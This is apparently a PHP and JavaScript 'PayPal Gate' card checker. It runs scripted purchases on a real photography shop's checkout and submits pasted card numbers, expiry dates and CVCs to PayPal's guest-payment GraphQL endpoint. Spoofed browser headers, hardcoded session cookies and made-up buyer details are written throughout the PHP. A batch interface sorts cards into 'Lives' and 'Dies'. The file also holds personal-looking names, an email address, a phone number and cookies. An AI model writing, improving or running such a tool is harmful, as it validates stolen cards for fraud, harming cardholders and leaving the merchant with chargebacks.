<?php

// Function to extract text between two strings
function findBetween($text, $start, $end) {
    $startPos = strpos($text, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($text, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($text, $startPos, $endPos - $startPos);
}

function processCard($cc) {
    
    $ccParts = explode('|', $cc);
    if (count($ccParts) !== 4) {
        return ['status' => 'Declined! ❌', 'message' => 'Invalid card format'];
    }
    list($number, $expMonth, $expYear, $cvc) = $ccParts;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lschroederphoto.com/shop/buy.php?id=235');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'cache-control: max-age=0',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://lschroederphoto.com',
        'priority: u=0, i',
        'referer: https://lschroederphoto.com/shop/buy.php?id=235',
        'sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'material=AcrylicPrint&sizeprice=8x8+%28%24117.00%29&filename=029A7015&caption=Five-Legged+Jumping+Spider');

    $response = curl_exec($ch);

    curl_setopt($ch, CURLOPT_URL, 'https://lschroederphoto.com/shop/checkout.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'cache-control: max-age=0',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://lschroederphoto.com',
        'priority: u=0, i',
        'referer: https://lschroederphoto.com/shop/cart.php',
        'sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    ]);
    curl_setopt($ch, CURLOPT_COOKIE, 'cart_cookie=%5B%7B%22photo%22%3A%22Five-Legged%20Jumping%20Spider%22%2C%22filename%22%3A%22029A7015%22%2C%22material%22%3A%22AcrylicPrint%22%2C%22size%22%3A%228x8%22%2C%22option%22%3A%22N%5C%2FA%22%2C%22price%22%3A%22117.00%22%2C%22shipping%22%3A9.949999999999999289457264239899814128875732421875%7D%5D; PHPSESSID=b5108d79e997f94bfe1e70b67c145f88');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'zipCode=&subtotal=117.00&salesTax=0.00&shippingCost=9.95&couponValue=0.00&totalPrice=117.00');

    $response = curl_exec($ch);

    curl_setopt($ch, CURLOPT_URL, 'https://lschroederphoto.com/shop/checkout.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'cache-control: max-age=0',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://lschroederphoto.com',
        'priority: u=0, i',
        'referer: https://lschroederphoto.com/shop/checkout.php',
        'sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: same-origin',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    ]);
    curl_setopt($ch, CURLOPT_COOKIE, 'cart_cookie=%5B%7B%22photo%22%3A%22Five-Legged%20Jumping%20Spider%22%2C%22filename%22%3A%22029A7015%22%2C%22material%22%3A%22AcrylicPrint%22%2C%22size%22%3A%228x8%22%2C%22option%22%3A%22N%5C%2FA%22%2C%22price%22%3A%22117.00%22%2C%22shipping%22%3A9.949999999999999289457264239899814128875732421875%7D%5D; PHPSESSID=b5108d79e997f94bfe1e70b67c145f88');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'firstName=Lucas&lastName=Lorenzo&address=E+Little+York+Rd+7912&address2=&city=Norman&state=NY&newzip=10010&country=United+States&email=valerie.jenkins%40gmail.com&manual_checkout=true&oldzip=&couponValue=0.00&salesTax=0.00&shippingCost=9.95&subtotal=117.00&totalPrice=117.00');

    $response = curl_exec($ch);


    $data = <<<EOD
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="user_action"

    CONTINUE
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="landing_page"

    BILLING
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="shipping_preference"

    SET_PROVIDED_ADDRESS
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="first_name"

    Lucas
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="last_name"

    Lorenzo
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="address1"

    E Little York Rd 7912
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="address2"


    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="city"

    Norman
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="state"

    NY
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="zip"

    10010
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="email"

    valerie.jenkins@gmail.com
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="orderNum"

    1741238642
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="totalPrice"

    134.69
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="shippingCost"

    9.95
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="salesTax"

    7.74
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="subtotal"

    117.00
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="discount"

    0.00
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs
    Content-Disposition: form-data; name="cart"

    a:1:{i:0;a:7:{s:5:"photo";s:26:"Five-Legged Jumping Spider";s:8:"filename";s:8:"029A7015";s:8:"material";s:12:"AcrylicPrint";s:4:"size";s:3:"8x8";s:6:"option";s:3:"N/A";s:5:"price";s:6:"117.00";s:8:"shipping";d:9.949999999999999289457264239899814128875732421875;}}
    ------WebKitFormBoundary4yGxpiSlnAYgZMEs--
    EOD;


    $url = "https://lschroederphoto.com/shop/api/createOrder.php";

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
        'accept-language: es-ES,es;q=0.9',
        'content-type: multipart/form-data; boundary=----WebKitFormBoundary4yGxpiSlnAYgZMEs',
        'origin: https://lschroederphoto.com',
        'priority: u=1, i',
        'referer: https://lschroederphoto.com/shop/checkout.php',
        'sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    ]);

    $response = curl_exec($ch);

    $idcar = findBetween($response, '"id":"', '"');

    $data = [
        "query" => '
            mutation payWithCard(
                $token: String!
                $card: CardInput!
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }
        ',
        "variables" => [
            "token" => $idcar,
            "card" => [
                "cardNumber" => $number,
                "type" => "VISA",
                "expirationDate" => "$expMonth/$expYear",
                "postalCode" => "10010",
                "securityCode" => "$cvc"
            ],
            "phoneNumber" => "8123672065",
            "firstName" => "Mario",
            "lastName" => "lopez",
            "billingAddress" => [
                "givenName" => "Mario",
                "familyName" => "lopez",
                "country" => "US",
                "line1" => "E Little York Rd 7912",
                "city" => "Norman",
                "state" => "CA",
                "postalCode" => "10010"
            ],
            "email" => "valerie.jenkins@gmail.com",
            "currencyConversionType" => "VENDOR"
        ],
        "operationName" => null
    ];

    $jsonData = json_encode($data);

    curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: */*',
        'accept-language: es-ES,es;q=0.9',
        'content-type: application/json',
        'origin: https://www.paypal.com',
        "paypal-client-context: $idcar",
        "paypal-client-metadata-id: $idcar",
        'priority: u=1, i',
        "referer: https://www.paypal.com/smart/card-fields?sessionID=uid_cd89ad1062_mdu6mjm6mtg&buttonSessionID=uid_fa8b8cc4ee_mdu6mjq6mdm&locale.x=es_ES&commit=true&hasShippingCallback=false&env=production&country.x=ES&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhKU1g1SlVVY2Z5Y045T0Q3RU9HZlRhdEU0Z1VrYnZ2VUpSYWhSXzlUX1pCbkxfR1d3SUlLX3RBSy1wY2QyOW5GaG5ZVXZCbV9CQk1RMzAiLCJhdHRycyI6eyJkYXRhLXVpZCI6InVpZF9nY3Viem91eHR3b2xyeWdpc2V3eXdmcnFjY3lwenMifX0&disable-card=&token=$idcar",
        'sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-fetch-storage-access: none',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'x-app-name: standardcardfields',
        'x-country: US',
    ]);
    curl_setopt($ch, CURLOPT_COOKIE, 'sc_f=Pp7UonACUolrj1bZt_6qG2T3q-BaEZRUxZi7wH2hg3wIQIBltVP61iKOcrelDt1lece4jiJIaIwMSRpfapTM-tneMwYKOBqhKkGrFW; KHcl0EuY7AKSMgfvHl7J5E7hPtK=79iPpiL5ePP8DcMPjVbunw7BfqIarbgWvHIJZzobJa4wXKOA0ZgPQjzGK4SsWoZqm0jJbzDNdUquLSao; ddi=ljGPzrIWrOUd7C-W_KcPUoI4QOros9a6hWDLkQ_SIv7OIZU4uNBKU2WgNhBgAJY5CQtMZxIowqMb2sVRybBjTJL-I7wOGG2MJNQ4KqPCUs01n2WN');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $messa = findBetween($response, '"code":"', '"');
    
    if (strpos($messa, 'EXISTING_ACCOUNT_RESTRICTED')!== false) {
       return ['status' => 'Approved! ✅', 'message' => "Charge $5,01"];
    } elseif (strpos($messa, 'VALIDATION_ERROR')!== false) {
        return ['status' => 'Approved! ✅', 'message' => $messa];
    } else {
        return ['status' => 'Declined! ❌', 'message' =>$messa];
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cc'])) {
    header('Content-Type: application/json');
    $cc = $_POST['cc'];
    $result = processCard($cc);
    echo json_encode($result);
    exit;
}

$site_page = "PayPal Gate"; 
$path = $_SERVER["DOCUMENT_ROOT"]; 
include($path."/static/v4/plugins/form/header.php"); 

?>
<section class="content">
   <div class="content__inner">
      <div class="card">
         <div class="card-body">
            <h4 class="card-title"><i class="zwicon-paypal"></i> PayPal Gate</h4>
            <div class="row">
               <div class="col-md-8">
                  <div class="input-group mb-3">
                     <textarea class="form-control" id="lista_ccs" rows="10" placeholder="Enter cards here..."></textarea>
                  </div>
                  <button type="button" id="iniciar" name="iniciar" class="btn btn-success">Start</button>
                  <button type="button" id="detener" name="detener" class="btn btn-danger">Stop</button>
               </div>
               <div class="col-md-4">
                  <div class="card">
                     <div class="card-body">
                        <h5 class="card-title">Stats</h5>
                        <p>Total: <span id="total">0</span></p>
                        <p>Checked: <span id="checked">0</span></p>
                        <p>Live: <span id="livestat">0</span></p>
                        <p>Die: <span id="diestat">0</span></p>
                        <p>Errors: <span id="errorstat">0</span></p>
                     </div>
                  </div>
               </div>
            </div>
            <br>
            <div class="row">
               <div class="col-md-12">
                  <div class="card">
                     <div class="card-body">
                        <h5 class="card-title">Lives <span id="lives_badge" class="badge badge-success">0</span></h5>
                        <div id="lives" style="max-height: 200px; overflow-y: auto;"></div>
                     </div>
                  </div>
               </div>
               <div class="col-md-12">
                  <div class="card">
                     <div class="card-body">
                        <h5 class="card-title">Dies <span id="dies_badge" class="badge badge-danger">0</span></h5>
                        <div id="dies" style="max-height: 200px; overflow-y: auto;"></div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
</section>

<script>
document.addEventListener('DOMContentLoaded', function () {
    const startButton = document.getElementById('iniciar');
    const stopButton = document.getElementById('detener');
    const ccList = document.getElementById('lista_ccs');
    
    let isChecking = false;
    let ccs = [];
    let currentIndex = 0;

    let total = 0;
    let checked = 0;
    let lives = 0;
    let dies = 0;
    let errors = 0;

    function updateStats() {
        document.getElementById('total').textContent = total;
        document.getElementById('checked').textContent = checked;
        document.getElementById('livestat').textContent = lives;
        document.getElementById('diestat').textContent = dies;
        document.getElementById('errorstat').textContent = errors;
    }

    function addToList(listId, badgeId, text) {
        const list = document.getElementById(listId);
        const badge = document.getElementById(badgeId);
        const p = document.createElement('p');
        p.textContent = text;
        list.appendChild(p);
        badge.textContent = parseInt(badge.textContent) + 1;
    }

    async function checkCard(cc) {
        if (!isChecking) return;

        try {
            const formData = new FormData();
            formData.append('cc', cc);

            const response = await fetch('', { // POST to same file
                method: 'POST',
                body: new URLSearchParams(formData)
            });
            const result = await response.json();
            
            checked++;
            if (result.status.includes('Approved')) {
                lives++;
                addToList('lives', 'lives_badge', `${cc} -> ${result.message}`);
            } else {
                dies++;
                addToList('dies', 'dies_badge', `${cc} -> ${result.message}`);
            }
        } catch (e) {
            errors++;
            addToList('dies', 'dies_badge', `${cc} -> Error`);
        }
        
        updateStats();
        currentIndex++;
        if (currentIndex < ccs.length && isChecking) {
            setTimeout(() => checkCard(ccs[currentIndex]), 1000); // 1-second delay
        } else {
            isChecking = false;
            startButton.disabled = false;
        }
    }

    startButton.addEventListener('click', () => {
        const rawCcs = ccList.value.trim().split('\n');
        ccs = rawCcs.filter(cc => cc.trim() !== '');
        
        if (ccs.length === 0) {
            alert('Please add cards.');
            return;
        }

        isChecking = true;
        startButton.disabled = true;
        
        total = ccs.length;
        checked = 0;
        lives = 0;
        dies = 0;
        errors = 0;
        currentIndex = 0;

        document.getElementById('lives').innerHTML = '';
        document.getElementById('dies').innerHTML = '';
        document.getElementById('lives_badge').textContent = '0';
        document.getElementById('dies_badge').textContent = '0';
        
        updateStats();
        checkCard(ccs[currentIndex]);
    });

    stopButton.addEventListener('click', () => {
        isChecking = false;
        startButton.disabled = false;
    });
});
</script>

<?php include($path."/static/v4/plugins/form/footer.php"); ?>